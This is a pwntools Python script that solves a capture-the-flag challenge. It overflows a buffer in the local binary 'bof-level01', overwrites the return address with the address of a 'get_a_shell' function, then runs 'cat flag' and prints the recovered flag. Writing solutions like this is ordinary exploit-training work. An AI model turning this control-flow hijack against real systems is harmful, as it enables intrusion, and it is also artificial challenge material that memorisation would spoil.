from pwn import *
import os


DEBUG = False # toggles gdb.debug or process
elf = ELF("./bof-level01")

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={})
else:
    io = elf.process(env={})

# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

get_shell_addr = p64(elf.symbols["get_a_shell"])

a = 0x4847464544434241
b = 0x6867666564636261

buf_len = 0x40 - 0x10

payload = (buf_len) * b"A" + p64(b) + p64(a)  + get_shell_addr

io.sendline(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)

